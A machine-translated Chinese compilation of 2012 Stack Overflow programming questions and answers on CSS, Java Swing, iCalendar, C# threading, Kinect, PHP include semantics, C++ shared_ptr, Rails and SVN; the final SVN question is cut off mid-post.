# html - 某些 CSS 元素未显示

> ID：13360425
> 
> 赞同：1
> 
> 时间：2012-11-13T12:03:36.137
> 
> 标签：html, css

新建网站，使用960网格系统，css如下：960_24_col text rest

我也在使用我自己的 style.css。

所以，我正在尝试将以下 css 应用于我的标题 2 (h2)

```
h2 {
font-size: 26px;
text-transform: lowercase;
border-bottom: 1px solid yellow;
padding-bottom: 30px;
margin-bottom: 15px;
} 
```

但它似乎并不适用。当我在 Chrome 中检查元素时，一些 h2 元素在我的 style.css 中被划掉（穿过它）......当我复制上面的代码说 text.css..它的作品（但也适用于其他 h1、h2、h3 等）

你们中的任何一个css向导都有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:06:31.300

CSS 文件按顺序读取。因此，如果加载了一个将样式设置为 on的`h1`文件，并且加载了另一个也将样式设置为 on的文件`h1`，则第二个文件将覆盖第一个文件。

解决此问题的一种讨厌的方法是添加`!important`到样式的末尾，即：

```
h2 {
    font-size: 26px;
    text-transform: lowercase;
    border-bottom: 1px solid yellow !important;
    padding-bottom: 30px;
    margin-bottom: 15px;
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-13T12:13:23.463

必须在 style.css 中为 h2 定义了一些其他样式chrome 检查*器中的删除线*表示该样式已被覆盖，请尝试查找 in 的任何其他`h2`出现`style.css`

或者，如果由于某些有意更改而想要保留两个样式定义，请尝试`!important`在您不想被覆盖的相应属性之后使用，以要求浏览器优先考虑该样式而不是其他样式

```
h2 {
font-size: 26px !important; /*same with every other property you want to give top priority*/
text-transform: lowercase;
border-bottom: 1px solid yellow;
padding-bottom: 30px;
margin-bottom: 15px;
} 
```

# iphone - 什么是“符号”。特别是在 Xcode 和 iOS 开发的上下文中

> ID：13360427
> 
> 赞同：0
> 
> 时间：2012-11-13T12:03:38.287
> 
> 标签：iphone, ios, xcode

在为 iOS 开发时，Xcode 经常给出有关**重复符号**的警告或错误。有时还有其他与**符号**相关的消息。

什么是符号？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:15:16.517

它是可执行（或对象）文件中的对象。编译器将函数、方法调用和全局变量转换为符号 - 这些本质上是可执行文件的一部分，它们指向全局变量的后备内存区域或函数代码的起始地址。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:15:22.720

这是编译器和链接器中使用的术语，用于在 Xcode 中提供错误和警告。在其最简单的形式中，符号是一种引用代码片段（例如变量、方法等）的方式，以便链接器可以在稍后将应用程序的所有部分链接在一起时解析它们。

重复符号是指它们被多次使用，因此链接器不知道要链接到哪一个。

这远远超出了 Objective C，并且是整个 C 编程/编译的基础。因此，网上有很多材料可以阅读这些内容。例如：

*   [http://www.lurklurk.org/linkers/linkers.html](http://www.lurklurk.org/linkers/linkers.html)
*   [http://en.wikipedia.org/wiki/Linker_](http://en.wikipedia.org/wiki/Linker_(computing) (计算)

# java - JFrame.dispose() 与 System.exit()

> ID：13360430
> 
> 赞同：37
> 
> 时间：2012-11-13T12:03:50.507
> 
> 标签：java, swing, jvm, jframe

这两种方法有什么区别 -`System.exit()`和`JFrame.dispose()`？

如果我们想在单击按钮时关闭 Java Swing 应用程序，我应该使用哪种方法？

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2012-11-13T12:08:48.073

`System.exit();`导致 Java VM 完全终止。

`JFrame.dispose();`导致`JFrame`窗口被操作系统销毁和清理。根据[文档](http://docs.oracle.com/javase/6/docs/api/java/awt/Window.html#dispose%28%29)，如果没有其他可用的 Windows，这可能会导致 Java VM 终止，但这实际上应该被视为副作用而不是常态。

你选择的那个真的取决于你的情况。如果你想终止当前 Java VM 中的所有内容，你应该使用`System.exit()`并且所有内容都会被清理。如果你只想销毁当前窗口，如果这是唯一的窗口，它会关闭 Java VM，然后使用`JFrame.dispose()`.

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-11-13T12:09:17.440

**JFrame.dispose()**

```
public void dispose() 
```

释放此 Window、其子组件及其所有子组件使用的所有本机屏幕资源。也就是说，这些组件的资源将被销毁，它们消耗的任何内存都将返回给操作系统，并且它们将被标记为不可显示。通过随后调用 pack 或 show 重建本机资源，可以使 Window 及其子组件再次可显示。重新创建的 Window 及其子组件的状态将与这些对象在 Window 被释放时的状态相同（不考虑这些操作之间的其他修改）。

**注意：**当 Java 虚拟机 (VM) 中的最后一个可显示窗口被处理掉时，VM 可能会终止。有关详细信息，请参阅 AWT 线程问题。

**System.exit()**

```
public static void exit(int status) 
```

终止当前运行的 Java 虚拟机。该参数用作状态码；按照惯例，非零状态码表示异常终止。该方法调用 Runtime 类中的 exit 方法。此方法永远不会正常返回。

该调用`System.exit(n)`实际上等同于调用：

```
Runtime.getRuntime().exit(n) 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-11-13T12:12:53.283

除了上述之外，您还可以使用`System.exit()`来返回一个退出代码，如果您使用它自动调用进程，这可能非常有用，`System.exit(code);`这可以帮助您确定例如在运行期间是否发生了错误。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-08-12T23:17:02.953

*   如果您打开了多个窗口并且只想关闭已关闭的窗口，请使用`JFrame.dispose().`

*   如果要关闭所有窗口并终止应用程序，请使用`System.exit()`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-09-11T14:22:06.973

JFrame.dispose() 仅影响此框架（释放此组件、其子组件和所有子组件使用的所有本机屏幕资源）。System.exit() 影响整个 JVM。

如果您想关闭所有 JFrame 或所有 Window（因为 Frames 扩展了 Windows）以有序模式终止应用程序，您可以执行以下操作：

```
Arrays.asList(Window.getWindows()).forEach(e -> e.dispose()); // or JFrame.getFrames() 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-09-22T08:42:46.520

如果您终止程序，则使用 System.exit(0);

另一方面，你有多个窗口，但你可以终止和关闭一个窗口，然后你使用 dispose();

# calendar - 搜索跨设备工作的 iCalendar 重复格式

> ID：13360431
> 
> 赞同：1
> 
> 时间：2012-11-13T12:03:51.863
> 
> 标签：calendar, google-calendar-api, icalendar, recurrence, rfc2445

我正在寻找一种在 iCalendar 中表示重复的方法，该方法适用于 Google 日历、Android 和 iOS。我正在使用一个时间表系统，其中每周重复很常见，但重复的模式并不总是规律的。

以下是一些示例，它们都适用于 Google 日历。理想情况下，我希望为所有设备提供一个提要。

**适用于 Android（但不适用于 iOS）**

```
BEGIN:VEVENT
DTSTAMP:20121113T111932Z
SUMMARY:A Series of Meetings
LOCATION:Somewhere
DESCRIPTION:Very important things to discuss
TZID:Europe/London
DTSTART;TZID=Europe/London:20121204T140000
DTEND;TZID=Europe/London:20121204T160000
RDATE;TZID=Europe/London:20121204T140000,20130115T140000,20130129T140000
SEQUENCE:1
UID:blahblahblah
END:VEVENT 
```

我发现如果我从 RDATE 列表中省略了 DTSTART 日期，它不会显示 Android 上的第一次活动发生（但在 Google 日历中显示）。我得出的结论是[RDATE 不适用于 Apple 设备](https://apple.stackexchange.com/questions/68535/does-os-x-calendar-nee-ical-support-rdate/)。

**适用于 iOS（但不适用于 Android）**

```
BEGIN:VEVENT
DTSTAMP:20121113T112004Z
SUMMARY:A Series of Meetings
LOCATION:Somewhere
DESCRIPTION:Very important things to discuss
TZID:Europe/London
DTSTART;TZID=Europe/London:20121204T140000
DTEND;TZID=Europe/London:20121204T160000
RRULE:FREQ=WEEKLY;UNTIL=20130129T140000;INTERVAL=1
EXDATE:20121211T140000,20121218T140000,20121225T140000,20130101T140000,20130108T140000,20130122T140000
SEQUENCE:1
UID:blahblahblah
END:VEVENT 
```

我很欣赏上面的 iOS 示例可能不是生成 RRULE 的最有效方法，但我正在寻找一种易于为各种模式的每周循环活动生成的方法。

iOS 示例在 Android 中失败，因为仅观察到第一个 EXDATE 条目。我认为 Google 日历将 EXDATE 放在不同的行上，因此将其用于 Android 消费。

# c# - 从 Windows 8 应用商店应用程序中的驱动器/文件夹中读取目录？

> ID：13360436
> 
> 赞同：2
> 
> 时间：2012-11-13T12:04:12.717
> 
> 标签：c#, windows-8

有什么方法可以读取 Windows 8 应用商店应用程序中驱动器/文件夹中的所有目录/文件？除了阅读已知的文件夹（文档、图片等）之外，我已经用谷歌搜索了，也许你们可以帮助我。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-16T15:46:40.800

在 WinStore 应用程序中，对文件/文件夹的访问受到限制。

您可以访问应用程序的安装文件夹，可通过 Windows.ApplicationModel.Package.Current.InstalledLocation 访问。

您可以通过 KnownFolders 类访问已知文件夹（文档、图片、视频等）。你必须声明适当的能力。例如，如果您需要访问 VideosLibrary 文件夹，则必须定义 VideosLibrary 功能。

来自其他位置的文件只能由 FilePicker 访问。

有关更多信息，请查看：

[KnownFolders 类 (Windows)](http://msdn.microsoft.com/en-us/library/windows/apps/windows.storage.knownfolders.aspx)

[Windows 应用商店应用程序中的文件访问和权限 (Windows)](http://msdn.microsoft.com/en-us/library/windows/apps/hh967755.aspx)

[应用功能声明（Windows 应用商店应用）(Windows)](http://msdn.microsoft.com/en-us/library/windows/apps/hh464936.aspx)

[与文件选择器合同集成（Windows 应用商店应用程序）（Windows）](http://msdn.microsoft.com/en-us/library/windows/apps/hh465174.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T16:40:56.760

根据我的经验，您无法扫描系统上的任意文件夹/驱动器。WinRT API 将您的访问范围限制为用户的“已知文件夹”。

这与 Windows 体验的其余部分一致，所有媒体都应保存在各自的库中。您无需在视频库之外查找电影。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-02T05:54:31.913

您可以通过这种方式访问​​驱动器和文件夹，但需要从 packageManifest 打开功能

StorageFolder folder5 = 等待 StorageFolder.GetFolderFromPathAsync(@"Z:\");

# c# - Parallel.For 和 For 产生不同的结果

> ID：13360437
> 
> 赞同：13
> 
> 时间：2012-11-13T12:04:20.843
> 
> 标签：c#, multithreading, c#-4.0, parallel-processing

如果我运行这个测试：

```
 var r = new Random();
 var ints = new int[13];
 Parallel.For(0, 2000000, i => {            
     var result = r.Next(1, 7) + r.Next(1, 7);
     ints[result] += 1;
 }); 
```

我得到以下结果：

```
2: 92,14445
3: 0,41765
4: 0,62245
5: 0,82525
6: 1,04035
7: 1,25215
8: 1,0531
9: 0,8341
10: 0,6334
11: 0,4192
12: 0,2109 
```

当我使用常规 For 时：

```
for (int i = 0; i < 2000000; i++) {
    var result = r.Next(1, 7) + r.Next(1, 7);
    ints[result] += 1;
} 
```

输出是：

```
2: 2,7797
3: 5,58645
4: 8,3414
5: 11,09935
6: 13,8909
7: 16,6731
8: 13,82895
9: 11,10205
10: 8,3424
11: 5,5712
12: 2,7845 
```

最后一个结果是三角分布，它是预期的输出。

我的问题的目的不是讨论并行性的适用性。问题是为什么 Parallel.For 会这样？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-11-13T12:07:07.600

Random 类方法不是线程安全的。

[http://msdn.microsoft.com/en-us/library/system.random.next(v=vs.90).aspx#2](http://msdn.microsoft.com/en-us/library/system.random.next(v=vs.90).aspx#2)

所以第一段代码只是展示了一些未定义的行为。

**编辑：**

至于一些猜测，根据我对操作系统的了解，我相信随机数生成是一个相当低级的操作，因此甚至可能*需要*上下文切换。在发生这种情况时，您最终可能会在有机会更新之前多次获取相同的随机数。这将解释不平衡的分布。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-13T12:16:52.260

除了@spencerruport 断言 Random 类不是线程安全的之外，您的并行代码也不是线程安全的：

```
 Parallel.For(0, 2000000, i => {            
     //say two threads produce same total at same time
     var result = r.Next(1, 7) + r.Next(1, 7); 
     //what happens on the next line when a context-switch
     //occurs during this non-atomic operation?
     ints[result] += 1;
 }); 
```

使用 PLINQ 代表您收集结果可能会更好：

```
Enumerable.Range(0, 2000000)
    .AsParallel()
    .Select(_ => SafeRandom(1, 7) + SafeRandom(1, 7))
    .GroupBy(x => x)
    .Select(g => new {value = g.Key, frequency = g.Count()}) 
```

而不是自己管理对共享内存（`ints`上面的数组）的访问。

的合理实现`SafeRandom`可能如下所示：

```
private static int seedUnique=0;
private static ThreadLocal<Random> tlRand=new ThreadLocal<Random>(() => {
    var x=Interlocked.Add(ref seedUnique, 93459872);
    var r=new Random((int)(DateTime.UtcNow.Ticks + x));
    return r;
});
public static int SafeRandom(int min, int max)
{
    return tlRand.Value.Next(min,max);
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-13T12:52:24.383

它是[`Random`](http://msdn.microsoft.com/en-us/library/system.random.next%28v=vs.90%29.aspx#2).

一旦我调用了`Random.Next()`线程安全，我就会按预期得到以下分布。

```
2: 2.76665
3: 5.5382
4: 8.30805
5: 11.13095
6: 13.8864
7: 16.6808
8: 13.8722
9: 11.14495
10: 8.3409
11: 5.5631
12: 2.76775

public static class Program
{
    private const int Max = 2000000;
    private static readonly object Lock = new object();

    public static void Main()
    {
        var r = new Random();
        var ints = new int[13];
        Parallel.For(0, Max, i =>
        {
            var result = Rand(r, 1, 7) + Rand(r, 1, 7);
            Interlocked.Increment(ref ints[result]);
        });

        for (int i = 0; i < ints.Length; i++)
        {
            Console.WriteLine("{0}: {1}",
                i, ints[i] / ((double)Max) * 100);
        }
    }

    private static int Rand(Random random, int minValue, int maxValue)
    {
        lock (Lock)
        {
            return random.Next(minValue, maxValue);
        }
    }
} 
```

# objective-c - 如何从 NSDate 倒计时并以小时和分钟显示

> ID：13360442
> 
> 赞同：4
> 
> 时间：2012-11-13T12:04:41.607
> 
> 标签：objective-c, ios, nsdate, nstimer

我正在尝试从 NSDate 倒计时并以小时和分钟显示。像这样：1h:18min

目前我的日期正在更新为 UILabel 并倒计时，但显示如下：

![计时器倒计时标签](../Images/524da4ebcf2d1cc879cda9c7b96a7f24.png)

这是我正在使用的代码。startTimer 方法和 updateLabel 方法

```
 - (void)startTimer {
        // Set the date you want to count from

    // convert date string to date then set to a label
    NSDateFormatter *dateStringParser = [[NSDateFormatter alloc] init];
    [dateStringParser setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss.000Z"];

    NSDate *date = [dateStringParser dateFromString:deadlineDate];

    NSDateFormatter *labelFormatter = [[NSDateFormatter alloc] init];
    [labelFormatter setDateFormat:@"HH-dd-MM-yyyy"];

    NSDate *countdownDate = [[NSDate alloc] init];

    countdownDate = date; 

    // Create a timer that fires every second repeatedly and save it in an ivar
    NSTimer *timer = [[NSTimer alloc] init];

    timer = [NSTimer scheduledTimerWithTimeInterval:1.0 target:self selector:@selector(updateLabel) userInfo:nil repeats:YES];

}

- (void)updateLabel {

    // convert date string to date then set to a label
    NSDateFormatter *dateStringParser = [[NSDateFormatter alloc] init];
    [dateStringParser setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss.000Z"];

    NSDate *date = [dateStringParser dateFromString:deadlineDate];

    NSDateFormatter *labelFormatter = [[NSDateFormatter alloc] init];
    [labelFormatter setDateFormat:@"HH-dd-MM"];

    NSTimeInterval timeInterval = [date timeIntervalSinceNow]; ///< Assuming this is in the future for now.

    self.deadlineLbl.text = [NSString stringWithFormat:@"%f", timeInterval];
} 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-13T12:16:00.180

```
- (NSString *)stringFromTimeInterval:(NSTimeInterval)interval 
  {
    NSInteger ti = (NSInteger)interval;
    NSInteger seconds = ti % 60;
    NSInteger minutes = (ti / 60) % 60;
    NSInteger hours = (ti / 3600);
    return [NSString stringWithFormat:@"%02i:%02i:%02i", hours, minutes, seconds];
  } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:09:44.787

由于您使用 NSTimeInterval ，您将获得时间间隔，即差异，以秒为单位，以小时和分钟显示它，您需要应用数学逻辑并转换它！你很多人需要几个循环来做到这一点。

试试这个

问候

# c# - 检查kinect是否连接

> ID：13360443
> 
> 赞同：1
> 
> 时间：2012-11-13T12:04:42.630
> 
> 标签：c#, wpf, xaml, kinect

我正在创建一个 WPF/C# 应用程序，它使用 kinect 来移动对象，但它也可以使用鼠标运行。目前我注释掉了 kinect 代码，因为它可以使用鼠标工作。我需要识别 kinect 是否已连接的方法，因此我不必注释掉代码以在未连接时使用鼠标（不会像当前那样抛出异常）并在连接时使用 kinect。我该怎么做？信息：我正在使用官方的 Microsoft Kinect SDK（大约一周前下载）

编辑——我正在使用这些

```
using System;
using System.ComponentModel;
using System.Threading;
using System.Windows;
using System.Windows.Media;
using System.Windows.Input;
using System.Windows.Media.Media3D;
using System.Windows.Media.Animation;
using System.Windows.Controls;
using System.Windows.Media.Imaging;
using GridAnimationDemo;
using System.Windows.Threading;
using HtmlAgilityPack;
using System.Xml.Linq;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Net;
using Microsoft.Research.Kinect.Nui;
using Microsoft.Research.Kinect.Audio;
using Microsoft.Research.Kinect;
using Microsoft.Office.Interop.PowerPoint;
using System.Windows.Data;
using Microsoft.Research.Kinect.Samples.CursorControl;
using Coding4Fun.Kinect.Wpf;
using Coding4Fun;
using System.Speech.Synthesis; 
```

无法添加参考和使用 Microsoft.Kinect，因为它会与其中一些产生冲突

编辑 -

```
Device dvc = new Device();
            if (dvc.Count.Equals(0))
                MessageBox.Show("apoellin"); 
```

我尝试了上面的代码，如果我在 Kinect 未连接的情况下使用任何 Kinect 代码，应用程序会崩溃并出现相同的错误

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-16T17:26:32.267

这是《Beginning Kinect Programming with the Microsoft SDK》一书中的代码，它很好地处理了这个问题

```
// (in your page/window constructor):

this.KinectDevice = KinectSensor.KinectSensors
.FirstOrDefault(x => x.Status == KinectStatus.Connected);

// (and create a property like this:)

public KinectSensor KinectDevice
{
get { return this._KinectDevice; }
set
{
if (this._KinectDevice != value)
{
//Uninitialize
if (this._KinectDevice != null)
{
this._KinectDevice.Stop();
this._KinectDevice.SkeletonFrameReady -= KinectDevice_SkeletonFrameReady;
this._KinectDevice.SkeletonStream.Disable();
this._FrameSkeletons = null;
}

this._KinectDevice = value;

//Initialize
if (this._KinectDevice != null)
{
if (this._KinectDevice.Status == KinectStatus.Connected)
{
this._KinectDevice.SkeletonStream.Enable();
this._FrameSkeletons = new
Skeleton[this._KinectDevice.SkeletonStream.FrameSkeletonArrayLength];
this.KinectDevice.SkeletonFrameReady +=
KinectDevice_SkeletonFrameReady;
ColorImageStream colorStream = this._KinectDevice.ColorStream;
colorStream.Enable();
this._ColorImageBitmap = new WriteableBitmap(colorStream.FrameWidth,
colorStream.FrameHeight, 96, 96, PixelFormats.Bgr32, null);
this._ColorImageBitmapRect = new Int32Rect(0, 0, colorStream.FrameWidth,
colorStream.FrameHeight);
this._ColorImageStride = colorStream.FrameWidth * colorStream.FrameBytesPerPixel;
ColorImageElement.Source = this._ColorImageBitmap;
this._KinectDevice.ColorFrameReady += Kinect_ColorFrameReady;

this.ColorImageElement.Dispatcher.BeginInvoke(new Action(() =>
{
this._ColorImageBitmap = new WriteableBitmap(colorStream.FrameWidth,
colorStream.FrameHeight,
96, 96, PixelFormats.Bgr32,
null);
this._ColorImageBitmapRect = new Int32Rect(0, 0, colorStream.FrameWidth,
colorStream.FrameHeight);
this._ColorImageStride = colorStream.FrameWidth *
colorStream.FrameBytesPerPixel;
this._ColorImagePixelData = new byte[colorStream.FramePixelDataLength];

this.ColorImageElement.Source = this._ColorImageBitmap;
}));
this._KinectDevice.Start();
}
}
}
}
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T14:59:17.070

您使用的是非常过时的 Kinect for Windows SDK 版本。命名空间来自`Microsoft.Research.Kinect`测试版。

最新的 SDK 可以在这里下载：

[http://www.microsoft.com/en-us/kinectforwindows/develop/developer-downloads.aspx](http://www.microsoft.com/en-us/kinectforwindows/develop/developer-downloads.aspx)

完成之后，下载开发者工具包，也可以从上面的链接获得。它包含如何执行许多任务的多个示例。

我强烈建议查看 Kinect Explorer 示例。这将向您展示如何使用名为 KinectSensorManager 的数据容器。此类是数据包装器，而不是 SDK 的一部分——它有助于管理 Kinect 传感器。它包含在几个 Toolkit 示例中。

除其他外，该类会在 Kinect 传感器状态更改时触发事件。因此，您可以将程序设置为在适当的事件处理程序中初始化和取消初始化 Kinect。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-01-29T11:07:21.920

我只想为 Kinect 2.0 SDK 添加一个答案。不幸的是，SDK 不再有`Runtime`命名空间或任何其他列出设备的方式。但是，您可以使用 WMI 来确定是否连接了 Kinect 2.0。

为此，您需要添加对 System.Management 库的引用。

```
public static bool IsConnected()
{            
    // Use WMI to find devices with the proper hardware id for the Kinect2
    // note that one Kinect2 is listed as three harwdare devices    
    string query = String.Format(WmiQuery, HardwareId);
    using (var searcher = new ManagementObjectSearcher(query))
    {
        using (var collection = searcher.Get())
        {
            return collection.Count > 0;
        }
    }            
}

private const string HardwareId = @"VID_045E&PID_02C4";
private const string WmiQuery = @"SELECT * FROM Win32_PnPEntity WHERE DeviceID LIKE '%{0}%'"; 
```

更新，由于微软停止了其 Windows 版 Kinect 2，现在使用 Xbox One 的 Windows 版 Kinect，我们发现并非所有 Kinect 2 都使用相同的 ID。目前我们使用这些 ID。这似乎有效。

```
<!-- Kinect 2 For Xbox -->
USB\VID_045E&PID_02C4
<!-- Kinect 2 For Windows -->
USB\VID_045E&PID_02D9 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-13T12:10:00.367

如果您使用的是最新的 Windows SDK，您可以检查`Runtime.Kinects.Count`.

如果值为 0，则没有连接 Kinect -

```
if (Runtime.Kinects.Count == 0)
{
    // No Kinects are connected
}
else
{
    // Kinect is connecetd
} 
```

# php - 使用 include()、include_once() 和 require() 构造的实际场景

> ID：13360444
> 
> 赞同：4
> 
> 时间：2012-11-13T12:05:07.637
> 
> 标签：php, require-once

其中`include`, `include_once`,`require`而`require_once`我总是只使用`require_once`. 许多第三方框架也只是使用`require_once`。

任何人都可以描述一个必须使用另一个构造的真实场景吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T12:19:28.563

恕我直言，没有适合的真实场景，`include`原因`include_once`有两个：

1.  您不太可能打算包含一个文件，同时您并不真正关心它是否包含（例如，如果文件不存在并且继续执行）。
2.  即使是这种情况，`include`也会发出一个风格不好的警告（零警告代码是一件值得努力的事情）。大多数情况下，您可以通过类似的检查来防止这种情况发生`is_file`，但是您知道该文件确实存在，那为什么不`require`呢？

对于`require`vs `require_once`：如果一个文件可以被多次合法地解析（例如一个 HTML 模板），则使用前者。如果它将代码带入您的应用程序（绝大多数情况下），请使用后者。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:07:56.603

`The require_once()`语句与`require()`除了 PHP 将检查文件是否已被包含，如果是，则不再包含（要求）它相同。

该`require()`函数与 相同`include()`，只是它处理错误的方式不同。如果发生错误，include() 函数会生成警告，但脚本会继续执行。`require()`生成一个致命错误，脚本将停止。

`include/require`和语句之间的唯一区别`include_once/require_once`是实际加载给定文件的次数。使用`include_once/require_once`语句时，无法多次加载或执行文件。如果尝试使用这两种方法之一加载文件两次，它将被忽略。因为在一个脚本中多次定义同一个函数是不可接受的，所以这些函数允许开发人员根据需要包含一个脚本，而不必检查它之前是否已加载。

```
<?php

    include ('library.inc');      
    $leap = is_leapyear(2003);

    require ('library.inc');     
    $leap = is_leapyear(2003);

?> 
```

如果两个语句都允许当前脚本在单独的文件中执行代码，那么两者有什么区别？

> 有两个主要区别：
> 
> 第一个是返回值的能力，第二个是在什么情况下加载请求的文件。使用`include`语句时，PHP 会延迟请求文件的实际加载，直到脚本到达执行该语句的点并用文件的内容`include`替换该语句。`include`相反，在语句的情况下，`require`无论`require`语句`require`（以及文件的内容）是否会在脚本的正常进程中执行，语句都会被请求文件的内容替换。
> 
> 引用以上段落来自`http://82.157.70.109/mirrorbooks/php5/067232511X/ch01lev1sec8.html`

**笔记**

从外部文件返回值的能力仅限于 include 和`include_once`语句。`require_once`不能以这种方式使用require 和语句。

**`require`给予`Fatal error`但`include`给予`Warning`**

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-13T12:12:40.670

如果找不到文件，include 构造将发出警告[；](http://php.net/manual/en/function.include.php)[这是与require](http://php.net/manual/en/function.require.php)不同的行为，它将发出致命`E_COMPILE_ERROR`级别的错误。

同样的差异也适用于`include_once`和`require_once`。

何时使用 include 和何时使用 require，[在要求、包含和 require_once 之间的区别的答案中描述得非常好？](https://stackoverflow.com/questions/2418473/when-should-i-use-require-once-vs-include)

从我的角度来看，有两件事。

1.  如果你有一些东西，这是绝对需要出现在你的应用程序中的，你应该使用`require`/`require_once`来包含这样的定义。这样，您将收到致命错误而不是警告，并且在开发过程中将简化查找有问题的代码。
2.  如果您包含外部资源或可能缺少的东西，则应将其包含在`include`/`include_once`中，以便能够使用[`@`](http://php.net/manual/en/language.operators.errorcontrol.php)运算符抑制可能的包含错误。

# c++ - 如何为成员创建 shared_ptr？

> ID：13360445
> 
> 赞同：6
> 
> 时间：2012-11-13T12:05:12.667
> 
> 标签：c++, c++11, shared-ptr

我不确定我是否因文档错误或头痛而遭受更多痛苦，所以...

我想要做的是创建一个 shared_ptr 与另一个共享所有权，但它引用对象的成员而不是整个对象。简单的例子，起点...

```
struct s
{
  int a, b;
};

shared_ptr<s> s1 (new s);  //  pointing to whole object 
```

从[en.cppreference.com](http://en.cppreference.com/w/cpp/memory/shared_ptr/shared_ptr)， shared_ptr 的构造函数（8）是......

```
template< class Y >
shared_ptr( const shared_ptr<Y>& r, T *ptr ); 
```

描述中提到“构造一个与 r 共享所有权信息的 shared_ptr，但拥有一个不相关且非托管的指针 ptr ...例如在 ptr 是 r 管理的对象的成员的典型用例中”。

所以...`T`只是不小心从该构造函数中的模板中遗漏了，还是我遗漏了什么？事实上，Y 对我来说似乎也是错误的，所以一般来说，构造函数的描述是否正确？

我希望我能做的是这样的事情......

```
shared_ptr<int> s2 (s1, &(s1.get ()->a)); 
```

`s2`指向成员`a`(an `int`)，但与 共享整个对象的所有权`s1`。

那是理智的吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-13T12:10:53.600

该`T`参数是其`shared_ptr`自身的模板参数，而该`Y`参数是该特定`shared_ptr`构造函数的模板参数。像这样的东西：

```
template< class T >
class shared_ptr
{
     template< class Y >
     shared_ptr( const shared_ptr<Y>& r, T *ptr );
} 
```

至于您发布的示例代码，我觉得这很好。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-13T12:13:14.387

文档是正确的。您忘记了这是类模板上构造函数的文档，即构造函数的`shared_ptr<T>`类限定声明是：

```
template<typename T>
template<typename Y>
shared_ptr<T>::shared_ptr(const shared_ptr<Y>& r, T *ptr); 
```

所以在你的例子`T`中 is`int`和`Y`is `s`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-13T12:13:16.880

`T`是类的模板参数，而不是构造函数的模板参数。这正是它所需要的：指向成员的指针必须具有成员的类型并忘记/擦除（参见类型擦除）包含对象的类型（`Y`在这种情况下）。

您发布的代码应该可以工作，您甚至可以将其编写得更简单一些：

```
shared_ptr<int> s2 (s1, &s1->a); 
```

# ruby-on-rails - 在两个请求之间传递长列表

> ID：13360449
> 
> 赞同：0
> 
> 时间：2012-11-13T12:05:20.890
> 
> 标签：ruby-on-rails

我有一个视图，用户可以在其中观察数据库中的部分对象：

```
class SyncController < ApplicationController
   def one
     @ids = get_ids(...)  # ids of objects, which user can see on the view
   end
end 
```

在同一个视图中，有一个链接必须通过这个@ids 删除数据库中的对象。所以我需要将这个 id 列表（[10000, 100001, 100009 ...]）传递给下一个方法。为此，我在视图上创建了链接：

```
<%= link_to "mark_as_read", { :controller => 'Sync', :action => "two", :ids => @ids }, :class => "mark_as_read_link", :remote => true %> 
```

在控制器中，我正在遍历此列表并删除对象：

```
def two
   params[:ids].each { |id|
    .....
   }
end 
```

我只是想知道是否有更好的方法来传递这个 ids-list，因为它可能很长而且我不确定这个链接没有任何限制。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:20:38.043

首先，URL 的长度有 2000 个字符左右的限制。（请参阅[URL 的最大长度是多少？](https://stackoverflow.com/questions/417142/what-is-the-maximum-length-of-a-url)）因此您不能以这种方式传递太多 id。

其次，GET 请求不像 POST 请求那样不受跨站点请求伪造的保护。

所以我认为更好的解决方案可能是创建一个表单并使用隐藏的 INPUT 标签保留 ID。

顺便说一句，您可以一键删除对象，而不是一一删除对象：`YourModel.delete_all(id: params[:ids])`

# svn - SVN工作副本有各种数据库等问题

> ID：13360450
> 
> 赞同：3
> 
> 时间：2012-11-13T12:05:21.500
> 
> 标签：svn, tortoisesvn

我们在办公室的开发服务器上保存了三个网站的 SVN 工作副本。服务器 WAS Linux，工作副本在 Windows 机器上工作，并使用 TortoiseSVN 更新/提交等。我会先说我知道网络共享上的工作副本不受严格支持，但这样做是为了在将它们放到实时服务器上之前，我们可以在本地开发 URL 上离线测试我们对站点的代码更改。

这工作非常出色。完全没有问题 - 直到我们的 Linux 服务器出现问题并不得不更换。我们已将其替换为 Mac，以扼杀在内部使用 Mac 进行浏览器测试的第二只鸟。

自从把所有东西都移到 Mac 上之后，SVN 就一直是个大问题。提交/更新通常会因“数据库已锁定”错误而失败，而且我大部分时间都无法清理，因为它通常会因以下错误而失败：

清理未能处理以下路径： PATH TO WC ON NETWORK 数据库已锁定，正在执行语句 'COMMIT TRANSACTION;'

正在执行的语句不同，有时与 RELEASE 有关。

